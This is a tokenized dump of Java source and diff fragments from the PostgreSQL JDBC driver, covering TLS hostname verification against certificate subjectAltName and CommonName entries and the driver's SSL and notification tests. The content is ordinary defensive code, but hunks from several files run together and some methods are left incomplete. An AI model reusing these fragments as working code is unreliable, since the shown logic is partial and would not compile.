")", "{", "/", "/", "just", "in", "case", "continue", ";", "}", "if", "(", "sanType", "!", "=", "TYPE_IP_ADDRESS", "&", "&", "sanType", "!", "=", "TYPE_DNS_NAME", ")", "{", "continue", ";", "}", "String", "san", "=", "(", "String", ")", "sanItem", ".", "get", "(", "1", ")", ";", "if", "(", "sanType", "=", "=", "TYPE_IP_ADDRESS", "&", "&", "san", ".", "startsWith", "(", "\"*", "\")", ")", "{", "/", "/", "Wildcards", "should", "not", "be", "present", "in", "the", "IP", "Address", "field", "continue", ";", "}", "anyDnsSan", "|", "=", "sanType", "=", "=", "TYPE_DNS_NAME", ";", "if", "(", "verifyHostName", "(", "canonicalHostname", ",", "san", ")", ")", "{", "if", "(", "LOGGER", ".", "isLoggable", "(", "Level", ".", "FINEST", ")", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "SEVERE", ",", "GT", ".", "tr", "(", "\"", "Server", "name", "validation", "pass", "for", "{", "0", "}", ",", "subjectAltName", "{", "1", "}", "\",", "hostname", ",", "san", ")", ");", "}", "return", "true", ";", "}", "}", "if", "(", "anyDnsSan", ")", "{", "/", "*", "*", "RFC2818", ",", "section", "3", ".", "1", "(", "I", "bet", "you", "won", "'", "t", "recheck", ":", ")", "*", "If", "a", "subjectAltName", "extension", "of", "type", "dNSName", "is", "present", ",", "that", "MUST", "*", "be", "used", "as", "the", "identity", ".", "Otherwise", ",", "the", "(", "most", "specific", ")", "Common", "Name", "*", "field", "in", "the", "Subject", "field", "of", "the", "certificate", "MUST", "be", "used", ".", "Although", "*", "the", "use", "of", "the", "Common", "Name", "is", "existing", "practice", ",", "it", "is", "deprecated", "and", "*", "Certification", "Authorities", "are", "encouraged", "to", "use", "the", "dNSName", "instead", ".", "*", "/", "LOGGER", ".", "log", "(", "Level", ".", "SEVERE", ",", "GT", ".", "tr", "(", "\"", "Server", "name", "validation", "failed", ":", "certificate", "for", "host", "{", "0", "}", "dNSName", "entries", "subjectAltName", ",", "\"", "+", "\"", "but", "none", "of", "them", "match", ".", "Assuming", "server", "name", "validation", "failed", "\"", ",", "hostname", ")", ");", "return", "false", ";", "}", "/", "/", "Last", "attempt", ":", "no", "DNS", "Subject", "Alternative", "Name", "entries", "detected", ",", "try", "common", "name", "LdapName", "DN", ";", "try", "{", "DN", "=", "new", "LdapName", "(", "serverCert", ".", "getSubjectX500Principal", "(", ").", "getName", "(", "X500Principal", ".", "RFC2253", ")", ");", "}", "catch", "(", "InvalidNameException", "e", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "SEVERE", ",", "GT", ".", "tr", "(", "\"", "Server", "name", "validation", "failed", ":", "unable", "to", "extract", "common", "name", "\"", "+", "\"", "from", "X509Certificate", "for", "hostname", "{", "0", "}", "\",", "hostname", ")", ",", "e", ")", ";", "return", "false", ";", "}", "List", "<", "String", ">", "commonNames", "=", "new", "ArrayList", "<", "String", ">", "(", "1", ")", ";", "for", "(", "Rdn", "rdn", ":", "DN", ".", "getRdns", "(", "))", "{", "if", "(", "\"", "CN", "\"", ".", "equals", "(", "rdn", ".", "getType", "(", "))", ")", "{", "commonNames", ".", "add", "(", "(", "String", ")", "rdn", ".", "getValue", "(", "))", ";", "}", "}", "if", "(", "commonNames", ".", "isEmpty", "(", "))", "{", "LOGGER", ".", "log", "(", "Level", ".", "SEVERE", ",", "GT", ".", "tr", "(", "\"", "Server", "name", "validation", "failed", ":", "certificate", "for", "hostname", "{", "0", "}", "has", "no", "DNS", "subjectAltNames", ",", "\"", "+", "\"", "and", "it", "CommonName", "is", "missing", "as", "well", "\"", ",", "hostname", ")", ");", "return", "false", ";", "}", "if", "(", "commonNames", ".", "size", "(", ")", ">", "1", ")", "{", "/", "*", "*", "RFC2818", ",", "section", "3", ".", "1", "*", "If", "a", "subjectAltName", "extension", "of", "type", "dNSName", "is", "present", ",", "that", "MUST", "*", "be", "used", "as", "the", "identity", ".", "Otherwise", ",", "the", "(", "most", "specific", ")", "Common", "Name", "*", "field", "in", "the", "Subject", "field", "of", "the", "certificate", "MUST", "be", "used", "*", "*", "The", "sort", "is", "from", "less", "specific", "to", "most", "specific", ".", "*", "/", "Collections", ".", "sort", "(", "commonNames", ",", "HOSTNAME_PATTERN_COMPARATOR", ")", ";", "}", "String", "commonName", "=", "commonNames", ".", "get", "(", "commonNames", ".", "size", "(", ")", "-", "1", ")", ";", "boolean", "result", "=", "verifyHostName", "(", "canonicalHostname", ",", "commonName", ")", ";", "if", "(", "!", "result", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "SEVERE", ",", "GT", ".", "tr", "(", "\"", "Server", "name", "validation", "failed", ":", "hostname", "{", "0", "}", "does", "not", "match", "common", "name", "{", "1", "}", "\",", "hostname", ",", "commonName", ")", ");", "}", "return", "result", ";", "}", "public", "boolean", "verifyHostName", "(", "String", "hostname", ",", "String", "pattern", ")", "{", "if", "(", "hostname", "=", "=", "null", "|", "|", "pattern", "=", "=", "null", ")", "{", "return", "false", ";", "}", "int", "lastStar", "=", "pattern", ".", "lastIndexOf", "(", "'*", "')", ";", "if", "(", "lastStar", "=", "=", "-", "1", ")", "{", "/", "/", "No", "wildcard", "=", ">", "just", "compare", "hostnames", "return", "hostname", ".", "equalsIgnoreCase", "(", "pattern", ")", ";", "}", "if", "(", "lastStar", ">", "0", ")", "{", "/", "/", "Wildcards", "like", "foo", "*", ".", "com", "are", "not", "supported", "yet", "return", "false", ";", "}", "if", "(", "pattern", ".", "indexOf", "(", "'.", "')", "=", "=", "-", "1", ")", "{", "/", "/", "Wildcard", "certificates", "should", "contain", "at", "least", "one", "dot", "return", "false", ";", "}", "/", "/", "pattern", "starts", "with", "*", ",", "so", "hostname", "should", "be", "at", "least", "(", "pattern", ".", "length", "-", "1", ")", "long", "if", "(", "hostname", ".", "length", "(", ")", "<", "pattern", ".", "length", "(", ")", "-", "1", ")", "{", "return", "false", ";", "}", "/", "/", "Use", "case", "insensitive", "comparison", "final", "boolean", "ignoreCase", "=", "true", ";", "/", "/", "Below", "code", "is", "\"", "hostname", ".", "endsWithIgnoreCase", "(", "pattern", ".", "withoutFirstStar", "(", "))", "\"", "/", "/", "E", ".", "g", ".", "hostname", "=", "=", "sub", ".", "host", ".", "com", ";", "pattern", "=", "=*", ".", "host", ".", "com", "/", "/", "We", "need", "to", "start", "the", "offset", "of", "\"", ".", "host", ".", "com", "\"", "in", "hostname", "/", "/", "For", "this", "we", "take", "hostname", ".", "length", "(", ")", "-", "pattern", ".", "length", "(", ")", "/", "/", "and", "+", "1", "is", "required", "since", "pattern", "is", "known", "to", "start", "with", "*", "int", "toffset", "=", "hostname", ".", "length", "(", ")", "-", "pattern", ".", "length", "(", ")", "+", "1", ";", "/", "/", "Wildcard", "covers", "just", "one", "domain", "level", "/", "/", "a", ".", "b", ".", "c", ".", "com", "should", "not", "be", "covered", "by", "*", ".", "c", ".", "com", "if", "(", "hostname", ".", "lastIndexOf", "(", "'.", "',", "toffset", "-", "1", ")", ">", "=", "0", ")", "{", "/", "/", "If", "there", "'", "s", "a", "dot", "in", "between", "0", ".", ".", "toffset", "return", "false", ";", "}", "return", "hostname", ".", "regionMatches", "(", "ignoreCase", ",", "toffset", ",", "pattern", ",", "1", ",", "pattern", ".", "length", "(", ")", "-", "1", ")", ";", "}", "}", "@", "@", "-", "1", ",", "270", "+", "1", ",", "63", "@", "@", "*", "Copyright", "(", "c", ")", "2017", ",", "PostgreSQL", "Global", "Development", "Group", "import", "org", ".", "postgresql", ".", "jdbc", ".", "SslMode", ";", "import", "org", ".", "postgresql", ".", "ssl", ".", "PGjdbcHostnameVerifier", ";", "import", "java", ".", "net", ".", "IDN", ";", "*", "@", "deprecated", "prefer", "{", "@", "link", "org", ".", "postgresql", ".", "ssl", ".", "LibPQFactory", "}", "@", "Deprecated", "public", "class", "LibPQFactory", "extends", "org", ".", "postgresql", ".", "ssl", ".", "LibPQFactory", "implements", "HostnameVerifier", "{", "private", "final", "SslMode", "sslMode", ";", "*", "sslmode", ",", "sslcert", ",", "sslkey", ",", "sslrootcert", ",", "sslhostnameverifier", ",", "sslpasswordcallback", ",", "sslpassword", "*", "@", "deprecated", "prefer", "{", "@", "link", "org", ".", "postgresql", ".", "ssl", ".", "LibPQFactory", "}", "@", "Deprecated", "super", "(", "info", ")", ";", "sslMode", "=", "SslMode", ".", "of", "(", "info", ")", ";", "*", "Verifies", "if", "given", "hostname", "matches", "pattern", ".", "*", "@", "deprecated", "use", "{", "@", "link", "PGjdbcHostnameVerifier", "}", "*", "@", "param", "hostname", "input", "hostname", "*", "@", "param", "pattern", "domain", "name", "pattern", "*", "@", "return", "true", "when", "domain", "matches", "pattern", "@", "Deprecated", "String", "canonicalHostname", ";", "if", "(", "hostname", ".", "startsWith", "(", "\"[", "\")", "&", "&", "hostname", ".", "endsWith", "(", "\"]", "\")", ")", "{", "/", "/", "IPv6", "address", "like", "[", "2001", ":", "db8", ":", "0", ":", "1", ":", "1", ":", "1", ":", "1", ":", "1", "]", "canonicalHostname", "=", "hostname", ".", "substring", "(", "1", ",", "hostname", ".", "length", "(", ")", "-", "1", ")", ";", "}", "else", "{", "/", "/", "This", "converts", "unicode", "domain", "name", "to", "ASCII", "try", "{", "canonicalHostname", "=", "IDN", ".", "toASCII", "(", "hostname", ")", ";", "}", "catch", "(", "IllegalArgumentException", "e", ")", "{", "/", "/", "e", ".", "g", ".", "hostname", "is", "invalid", "return", "false", ";", "}", "return", "PGjdbcHostnameVerifier", ".", "INSTANCE", ".", "verifyHostName", "(", "canonicalHostname", ",", "pattern", ")", ";", "*", "@", "deprecated", "use", "PgjdbcHostnameVerifier", "*", "@", "see", "PGjdbcHostnameVerifier", "@", "Deprecated", "if", "(", "!", "sslMode", ".", "verifyPeerName", "(", "))", "{", "return", "true", ";", "return", "PGjdbcHostnameVerifier", ".", "INSTANCE", ".", "verify", "(", "hostname", ",", "session", ")", ";", "*", "@", "param", "classname", "name", "of", "the", "class", "to", "instantiate", "/", "*", "*", "The", "case", "is", "as", "follows", ":", "*", "1", ".", "Typically", "the", "database", "and", "hostname", "are", "taken", "from", "System", ".", "properties", "or", "build", ".", "properties", "or", "build", ".", "local", ".", "properties", "*", "That", "enables", "to", "override", "test", "DB", "via", "system", "property", "*", "2", ".", "There", "are", "tests", "where", "different", "DBs", "should", "be", "used", "(", "e", ".", "g", ".", "SSL", "tests", ")", ",", "so", "we", "can", "'", "t", "just", "use", "DB", "name", "from", "system", "property", "*", "That", "is", "why", "_test_", "properties", "exist", ":", "they", "overpower", "System", ".", "properties", "and", "build", ".", "properties", "*", "/", "public", "static", "final", "String", "SERVER_HOST_PORT_PROP", "=", "\"", "_test_hostport", "\"", ";", "public", "static", "final", "String", "DATABASE_PROP", "=", "\"", "_test_database", "\"", ";", "return", "getURL", "(", "getServer", "(", "),", "+", "getPort", "(", "))", ";", "return", "getURL", "(", "server", "+", "\"", ":\"", "+", "port", ",", "getDatabase", "(", "))", ";", "}", "public", "static", "String", "getURL", "(", "String", "hostport", ",", "String", "database", ")", "{", "+", "hostport", "+", "\"", "/\"", "+", "database", "+", "\"", "?", "ApplicationName", "=", "Driver", "Tests", "\"", "+", "logLevel", "+", "logFile", "/", "*", "*", "Returns", "password", "for", "default", "callbackhandler", "*", "/", "public", "static", "String", "getSslPassword", "(", ")", "{", "return", "System", ".", "getProperty", "(", "PGProperty", ".", "SSL_PASSWORD", ".", "getName", "(", "))", ";", "}", "String", "sslPassword", "=", "getSslPassword", "(", ");", "if", "(", "sslPassword", "!", "=", "null", ")", "{", "PGProperty", ".", "SSL_PASSWORD", ".", "set", "(", "props", ",", "sslPassword", ")", ";", "}", "/", "/", "Enable", "Base4", "tests", "to", "override", "host", ",", "port", ",", "database", "String", "hostport", "=", "props", ".", "getProperty", "(", "SERVER_HOST_PORT_PROP", ",", "getServer", "(", ")", "+", "\"", ":\"", "+", "getPort", "(", "))", ";", "String", "database", "=", "props", ".", "getProperty", "(", "DATABASE_PROP", ",", "getDatabase", "(", "))", ";", "return", "DriverManager", ".", "getConnection", "(", "getURL", "(", "hostport", ",", "database", ")", ",", "props", ")", ";", "import", "org", ".", "postgresql", ".", "PGConnection", ";", "PGNotification", "[", "]", "notifications", "=", "conn", ".", "unwrap", "(", "PGConnection", ".", "class", ")", ".", "getNotifications", "(", ");", "PGNotification", "[", "]", "notifications", "=", "conn", ".", "unwrap", "(", "PGConnection", ".", "class", ")", ".", "getNotifications", "(", ");", "&", "&", "(", "notifications", "=", "conn", ".", "unwrap", "(", "PGConnection", ".", "class", ")", ".", "getNotifications", "(", "))", "=", "=", "null", ")", "{", "assertNotNull", "(", "\"", "Notification", "is", "expected", "to", "be", "delivered", "when", "subscription", "was", "created", "\"", "+", "\"", "before", "sending", "notification", "\"", ",", "notifications", ")", ";", "PGNotification", "[", "]", "notifications", "=", "conn", ".", "unwrap", "(", "PGConnection", ".", "class", ")", ".", "getNotifications", "(", "500", ")", ";", "PGNotification", "[", "]", "notifications", "=", "conn", ".", "unwrap", "(", "PGConnection", ".", "class", ")", ".", "getNotifications", "(", "10000", ")", ";", "PGNotification", "[", "]", "notifications", "=", "conn", ".", "unwrap", "(", "PGConnection", ".", "class", ")", ".", "getNotifications", "(", "0", ")", ";", "PGNotification", "[", "]", "notifications", "=", "conn", ".", "unwrap", "(", "PGConnection", ".", "class", ")", ".", "getNotifications", "(", "10000", ")", ";", "PGNotification", "[", "]", "notifications", "=", "conn", ".", "unwrap", "(", "PGConnection", ".", "class", ")", ".", "getNotifications", "(", "0", ")", ";", "conn", ".", "unwrap", "(", "PGConnection", ".", "class", ")", ".", "getNotifications", "(", "40000", ")", ";", "/", "*", "*", "Copyright", "(", "c", ")", "2018", ",", "PostgreSQL", "Global", "Development", "Group", "*", "See", "the", "LICENSE", "file", "in", "the", "project", "root", "for", "more", "information", ".", "*", "/", "package", "org", ".", "postgresql", ".", "test", ".", "ssl", ";", "import", "org", ".", "postgresql", ".", "ssl", ".", "PGjdbcHostnameVerifier", ";", "import", "org", ".", "junit", ".", "Assert", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "junit", ".", "runner", ".", "RunWith", ";", "import", "org", ".", "junit", ".", "runners", ".", "Parameterized", ";", "import", "java", ".", "util", ".", "Arrays", ";", "@", "RunWith", "(", "Parameterized", ".", "class", ")", "public", "class", "CommonNameVerifierTest", "{", "private", "final", "String", "a", ";", "private", "final", "String", "b", ";", "private", "final", "int", "expected", ";", "public", "CommonNameVerifierTest", "(", "String", "a", ",", "String", "b", ",", "int", "expected", ")", "{", "this", ".", "a", "=", "a", ";", "this", ".", "b", "=", "b", ";", "this", ".", "expected", "=", "expected", ";", "}", "@", "Parameterized", ".", "Parameters", "(", "name", "=", "\"", "a", "=", "{", "0", "}", ",", "b", "=", "{", "1", "}", "\")", "public", "static", "Iterable", "<", "Object", "[", "]>", "data", "(", ")", "{", "return", "Arrays", ".", "asList", "(", "new", "Object", "[", "][", "]{", "{", "\"", "com", "\"", ",", "\"", "host", ".", "com", "\"", ",", "-", "1", "}", ",", "{", "\"*", ".", "com", "\"", ",", "\"", "host", ".", "com", "\"", ",", "-", "1", "}", ",", "{", "\"*", ".", "com", "\"", ",", "\"", "*.", "*.", "com", "\"", ",", "-", "1", "}", ",", "{", "\"*", "*.", "com", "\"", ",", "\"", "*.", "com", "\"", ",", "-", "1", "}", ",", "{", "\"", "a", ".", "com", "\"", ",", "\"", "*.", "host", ".", "com", "\"", ",", "-", "1", "}", ",", "{", "\"", "host", ".", "com", "\"", ",", "\"", "subhost", ".", "host", ".", "com", "\"", ",", "-", "1", "}", ",", "{", "\"", "host", ".", "com", "\"", ",", "\"", "host", ".", "com", "\"", ",", "0", "}", "}", ");", "}", "@", "Test", "public", "void", "comparePatterns", "(", ")", "throws", "Exception", "{", "Assert", ".", "assertEquals", "(", "a", "+", "\"", "vs", "\"", "+", "b", ",", "expected", ",", "PGjdbcHostnameVerifier", ".", "HOSTNAME_PATTERN_COMPARATOR", ".", "compare", "(", "a", ",", "b", ")", ");", "Assert", ".", "assertEquals", "(", "b", "+", "\"", "vs", "\"", "+", "a", ",", "-", "expected", ",", "PGjdbcHostnameVerifier", ".", "HOSTNAME_PATTERN_COMPARATOR", ".", "compare", "(", "b", ",", "a", ")", ");", "}", "}", "@", "@", "-", "3", ",", "8", "+", "3", ",", "9", "@", "@", "package", "org", ".", "postgresql", ".", "test", ".", "ssl", ";", "import", "org", ".", "postgresql", ".", "ssl", ".", "PGjdbcHostnameVerifier", ";", "{", "\"", "com", "\"", ",", "\"", "*\"", ",", "false", "}", ",", "/", "/", "Wildcard", "should", "have", "al", "least", "one", "dot", "Assert", ".", "assertEquals", "(", "hostname", "+", "\"", ",", "pattern", ":", "\"", "+", "pattern", ",", "expected", ",", "LibPQFactory", ".", "verifyHostName", "(", "hostname", ",", "pattern", ")", ");", "Assert", ".", "assertEquals", "(", "hostname", "+", "\"", ",", "pattern", ":", "\"", "+", "pattern", ",", "expected", ",", "PGjdbcHostnameVerifier", ".", "INSTANCE", ".", "verifyHostName", "(", "hostname", ",", "pattern", ")", ");", "*", "Copyright", "(", "c", ")", "2018", ",", "PostgreSQL", "Global", "Development", "Group", "import", "org", ".", "postgresql", ".", "PGProperty", ";", "import", "org", ".", "postgresql", ".", "jdbc", ".", "SslMode", ";", "import", "org", ".", "postgresql", ".", "test", ".", "jdbc2", ".", "BaseTest4", ";", "import", "org", ".", "postgresql", ".", "util", ".", "PSQLState", ";", "import", "org", ".", "junit", ".", "Assert", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "junit", ".", "runner", ".", "RunWith", ";", "import", "org", ".", "junit", ".", "runners", ".", "Parameterized", ";", "import", "java", ".", "io", ".", "FileNotFoundException", ";", "import", "java", ".", "net", ".", "SocketException", ";", "import", "java", ".", "security", ".", "cert", ".", "CertPathValidatorException", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Collection", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "List", ";", "import", "javax", ".", "net", ".", "ssl", ".", "SSLHandshakeException", ";", "@", "RunWith", "(", "Parameterized", ".", "class", ")", "public", "class", "SslTest", "extends", "BaseTest4", "{", "enum", "Hostname", "{", "GOOD", "(", "\"", "localhost", "\"", "),", "BAD", "(", "\"", "127", ".", "0", ".", "0", ".", "1", "\"", "),", ";", "final", "String", "value", ";", "Hostname", "(", "String", "value", ")", "{", "this", ".", "value", "=", "value", ";", "}", "}", "enum", "TestDatabase", "{", "hostdb", ",", "hostnossldb", ",", "hostssldb", ",", "hostsslcertdb", ",", "certdb", ",", ";", "public", "static", "final", "TestDatabase", "[", "]", "VALUES", "=", "values", "(", ");", "public", "boolean", "requiresClientCert", "(", ")", "{", "return", "this", "=", "=", "certdb", "|", "|", "this", "=", "=", "hostsslcertdb", ";", "}", "public", "boolean", "requiresSsl", "(", ")", "{", "return", "this", "=", "=", "certdb", "|", "|", "this", "=", "=", "hostssldb", "|", "|", "this", "=", "=", "hostsslcertdb", ";", "}", "public", "boolean", "rejectsSsl", "(", ")", "{", "return", "this", "=", "=", "hostnossldb", ";", "}", "}", "enum", "ClientCertificate", "{", "EMPTY", "(", "\"\"", "),", "GOOD", "(", "\"", "goodclient", "\"", "),", "BAD", "(", "\"", "badclient", "\"", "),", ";", "public", "static", "final", "ClientCertificate", "[", "]", "VALUES", "=", "values", "(", ");", "public", "final", "String", "fileName", ";", "ClientCertificate", "(", "String", "fileName", ")", "{", "this", ".", "fileName", "=", "fileName", ";", "}", "}", "enum", "ClientRootCertificate", "{", "EMPTY", "(", "\"\"", "),", "GOOD", "(", "\"", "goodroot", "\"", "),", "BAD", "(", "\"", "badroot", "\"", "),", ";", "public", "static", "final", "ClientRootCertificate", "[", "]", "VALUES", "=", "values", "(", ");", "public", "final", "String", "fileName", ";", "ClientRootCertificate", "(", "String", "fileName", ")", "{", "this", ".", "fileName", "=", "fileName", ";", "}", "}", "@", "Parameterized", ".", "Parameter", "(", "0", ")", "public", "Hostname", "host", ";", "@", "Parameterized", ".", "Parameter", "(", "1", ")", "public", "TestDatabase", "db", ";", "@", "Parameterized", ".", "Parameter", "(", "2", ")", "public", "SslMode", "sslmode", ";", "@", "Parameterized", ".", "Parameter", "(", "3", ")", "public", "ClientCertificate", "clientCertificate", ";", "@", "Parameterized", ".", "Parameter", "(", "4", ")", "public", "ClientRootCertificate", "clientRootCertificate", ";", "@", "Parameterized", ".", "Parameter", "(", "5", ")", "public", "String", "certdir", ";", "@", "Parameterized", ".", "Parameters", "(", "name", "=", "\"", "host", "=", "{", "0", "}", ",", "db", "=", "{", "1", "}", "sslMode", "=", "{", "2", "}", ",", "cCert", "=", "{", "3", "}", ",", "cRootCert", "=", "{", "4", "}", "\")", "public", "static", "Iterable", "<", "Object", "[", "]>", "data", "(", ")", "{", "Properties", "prop", "=", "TestUtil", ".", "loadPropertyFiles", "(", "\"", "ssltest", ".", "properties", "\"", ");", "String", "enableSslTests", "=", "prop", ".", "getProperty", "(", "\"", "enable_ssl_tests", "\"", ");", "if", "(", "!", "Boolean", ".", "valueOf", "(", "enableSslTests", ")", ")", "{", "System", ".", "out", ".", "println", "(", "\"", "enableSslTests", "is", "\"", "+", "enableSslTests", "+", "\"", ",", "skipping", "SSL", "tests", "\"", ");", "return", "Collections", ".", "emptyList", "(", ");", "}", "Collection", "<", "Object", "[", "]>", "tests", "=", "new", "ArrayList", "<", "Object", "[", "]>", "()", ";", "File", "certDirFile", "=", "TestUtil", ".", "getFile", "(", "prop", ".", "getProperty", "(", "\"", "certdir", "\"", "))", ";", "String", "certdir", "=", "certDirFile", ".", "getAbsolutePath", "(", ");", "for", "(", "SslMode", "sslMode", ":", "SslMode", ".", "VALUES", ")", "{", "for", "(", "Hostname", "hostname", ":", "Hostname", ".", "values", "(", "))", "{", "for", "(", "TestDatabase", "database", ":", "TestDatabase", ".", "VALUES", ")", "{", "for", "(", "ClientCertificate", "clientCertificate", ":", "ClientCertificate", ".", "VALUES", ")", "{", "for", "(", "ClientRootCertificate", "rootCertificate", ":", "ClientRootCertificate", ".", "VALUES", ")", "{", "if", "(", "(", "sslMode", "=", "=", "SslMode", ".", "DISABLE", "|", "|", "database", ".", "rejectsSsl", "(", "))", "&", "&", "(", "clientCertificate", "!", "=", "ClientCertificate", ".", "GOOD", "|", "|", "rootCertificate", "!", "=", "ClientRootCertificate", ".", "GOOD", ")", ")", "{", "/", "/", "When", "SSL", "is", "disabled", ",", "it", "does", "not", "make", "sense", "to", "verify", "\"", "bad", "certificates", "\"", "/", "/", "since", "certificates", "are", "NOT", "used", "in", "plaintext", "connections", "continue", ";", "}", "if", "(", "database", ".", "rejectsSsl", "(", ")", "&", "&", "(", "sslMode", ".", "verifyCertificate", "(", ")", "|", "|", "hostname", "=", "=", "Hostname", ".", "BAD", ")", ")", "{", "/", "/", "DB", "would", "reject", "SSL", "connection", ",", "so", "it", "makes", "no", "sense", "to", "test", "cases", "like", "verify", "-", "full", "continue", ";", "}", "tests", ".", "add", "(", "new", "Object", "[", "]{", "hostname", ",", "database", ",", "sslMode", ",", "clientCertificate", ",", "rootCertificate", ",", "certdir", "}", ");", "}", "}", "}", "}", "return", "tests", ";", "}", "@", "Override", "protected", "void", "updateProperties", "(", "Properties", "props", ")", "{", "super", ".", "updateProperties", "(", "props", ")", ";", "props", ".", "put", "(", "TestUtil", ".", "SERVER_HOST_PORT_PROP", ",", "host", ".", "value", "+", "\"", ":\"", "+", "TestUtil", ".", "getPort", "(", "))", ";", "props", ".", "put", "(", "TestUtil", ".", "DATABASE_PROP", ",", "db", ".", "toString", "(", "))", ";", "PGProperty", ".", "SSL_MODE", ".", "set", "(", "props", ",", "sslmode", ".", "value", ")", ";", "if", "(", "clientCertificate", "=", "=", "ClientCertificate", ".", "EMPTY", ")", "{", "PGProperty", ".", "SSL_CERT", ".", "set", "(", "props", ",", "\"", "\")", ";", "PGProperty", ".", "SSL_KEY", ".", "set", "(", "props", ",", "\"", "\")", ";", "}", "else", "{", "PGProperty", ".", "SSL_CERT", ".", "set", "(", "props", ",", "certdir", "+", "\"", "/\"", "+", "clientCertificate", ".", "fileName", "+", "\"", ".", "crt", "\"", ");", "PGProperty", ".", "SSL_KEY", ".", "set", "(", "props", ",", "certdir", "+", "\"", "/\"", "+", "clientCertificate", ".", "fileName", "+", "\"", ".", "pk8", "\"", ");", "}", "if", "(", "clientRootCertificate", "=", "=", "ClientRootCertificate", ".", "EMPTY", ")", "{", "PGProperty", ".", "SSL_ROOT_CERT", ".", "set", "(", "props", ",", "\"", "\")", ";", "}", "else", "{", "PGProperty", ".", "SSL_ROOT_CERT", ".", "set", "(", "props", ",", "certdir", "+", "\"", "/\"", "+", "clientRootCertificate", ".", "fileName", "+", "\"", ".", "crt", "\"", ");", "}", "}", "@", "Override", "public", "void", "setUp", "(", ")", "throws", "Exception", "{", "SQLException", "e", "=", "null", ";", "try", "{", "super", ".", "setUp", "(", ");", "e", "=", "ex", ";", "}", "try", "{", "/", "/", "Note", "that", "checkErrorCodes", "throws", "AssertionError", "for", "unexpected", "cases", "checkErrorCodes", "(", "e", ")", ";", "}", "catch", "(", "AssertionError", "ae", ")", "{", "/", "/", "Make", "sure", "original", "SQLException", "is", "printed", "as", "well", "even", "in", "case", "of", "AssertionError", "if", "(", "e", "!", "=", "null", ")", "{", "ae", ".", "initCause", "(", "e", ")", ";", "}", "throw", "ae", ";", "}", "}", "private", "void", "assertClientCertRequired", "(", "SQLException", "e", ",", "String", "caseName", ")", "{", "if", "(", "e", "=", "=", "null", ")", "{", "Assert", ".", "fail", "(", "caseName", "+", "\"", "should", "result", "in", "failure", "of", "client", "validation", "\"", ");", "}", "Assert", ".", "assertEquals", "(", "caseName", "+", "\"", "=", "=>", "CONNECTION_FAILURE", "is", "expected", "\"", ",", "PSQLState", ".", "INVALID_AUTHORIZATION_SPECIFICATION", ".", "getState", "(", "),", "e", ".", "getSQLState", "(", "))", ";", "}", "private", "void", "checkErrorCodes", "(", "SQLException", "e", ")", "{", "if", "(", "e", "=", "=", "null", "&", "&", "sslmode", "=", "=", "SslMode", ".", "ALLOW", "&", "&", "!", "db", ".", "requiresSsl", "(", "))", "{", "/", "/", "allowed", "to", "connect", "with", "plain", "connection", "return", ";", "}", "if", "(", "clientRootCertificate", "=", "=", "ClientRootCertificate", ".", "EMPTY", "&", "&", "(", "sslmode", "=", "=", "SslMode", ".", "VERIFY_CA", "|", "|", "sslmode", "=", "=", "SslMode", ".", "VERIFY_FULL", ")", ")", "{", "String", "caseName", "=", "\"", "rootCertificate", "is", "missing", "and", "sslmode", "=", "\"", "+", "sslmode", ";", "if", "(", "e", "=", "=", "null", ")", "{", "Assert", ".", "fail", "(", "caseName", "+", "\"", "should", "result", "in", "FileNotFound", "exception", "for", "root", "certificate", "\"", ");", "}", "Assert", ".", "assertEquals", "(", "caseName", "+", "\"", "=", "=>", "CONNECTION_FAILURE", "is", "expected", "\"", ",", "PSQLState", ".", "CONNECTION_FAILURE", ".", "getState", "(", "),", "e", ".", "getSQLState", "(", "))", ";", "FileNotFoundException", "fnf", "=", "findCause", "(", "e", ",", "FileNotFoundException", ".", "class", ")", ";", "if", "(", "fnf", "=", "=", "null", ")", "{", "Assert", ".", "fail", "(", "caseName", "+", "\"", "=", "=>", "FileNotFoundException", "should", "be", "present", "in", "getCause", "chain", "\"", ");", "}", "return", ";", "}", "if", "(", "db", ".", "requiresSsl", "(", ")", "&", "&", "sslmode", "=", "=", "SslMode", ".", "DISABLE", ")", "{", "String", "caseName", "=", "\"", "sslmode", "=", "DISABLE", "and", "database", "\"", "+", "db", "+", "\"", "requires", "SSL", "\"", ";", "if", "(", "e", "=", "=", "null", ")", "{", "Assert", ".", "fail", "(", "caseName", "+", "\"", "should", "result", "in", "connection", "failure", "\"", ");", "}", "Assert", ".", "assertEquals", "(", "caseName", "+", "\"", "=", "=>", "INVALID_AUTHORIZATION_SPECIFICATION", "is", "expected", "\"", ",", "PSQLState", ".", "INVALID_AUTHORIZATION_SPECIFICATION", ".", "getState", "(", "),", "e", ".", "getSQLState", "(", "))", ";", "return", ";", "}", "if", "(", "db", ".", "rejectsSsl", "(", ")", "&", "&", "sslmode", ".", "requireEncryption", "(", "))", "{", "String", "caseName", "=", "\"", "database", "\"", "+", "db", "+", "\"", "rejects", "SSL", ",", "and", "sslmode", "\"", "+", "sslmode", "+", "\"", "requires", "encryption", "\"", ";", "if", "(", "e", "=", "=", "null", ")", "{", "Assert", ".", "fail", "(", "caseName", "+", "\"", "should", "result", "in", "connection", "failure", "\"", ");", "Assert", ".", "assertEquals", "(", "caseName", "+", "\"", "=", "=>", "INVALID_AUTHORIZATION_SPECIFICATION", "is", "expected", "\"", ",", "PSQLState", ".", "INVALID_AUTHORIZATION_SPECIFICATION", ".", "getState", "(", "),", "e", ".", "getSQLState", "(", "))", ";", "return", ";", "}", "/", "/", "Server", "certificate", ",", "server", "hostname", ",", "and", "client", "certificate", "can", "be", "validated", "in", "any", "order", "/", "/", "So", "we", "have", "three", "validators", "and", "expect", "at", "least", "one", "of", "them", "to", "match", "List", "<", "AssertionError", ">", "errors", "=", "null", ";", "try", "{", "if", "(", "assertServerCertificate", "(", "e", ")", ")", "{", "return", ";", "}", "}", "catch", "(", "AssertionError", "ae", ")", "{", "errors", "=", "addError", "(", "errors", ",", "ae", ")", ";", "}", "try", "{", "if", "(", "assertServerHostname", "(", "e", ")", ")", "{", "return", ";", "}", "}", "catch", "(", "AssertionError", "ae", ")", "{", "errors", "=", "addError", "(", "errors", ",", "ae", ")", ";", "}", "try", "{", "if", "(", "assertClientCertificate", "(", "e", ")", ")", "{", "return", ";", "}", 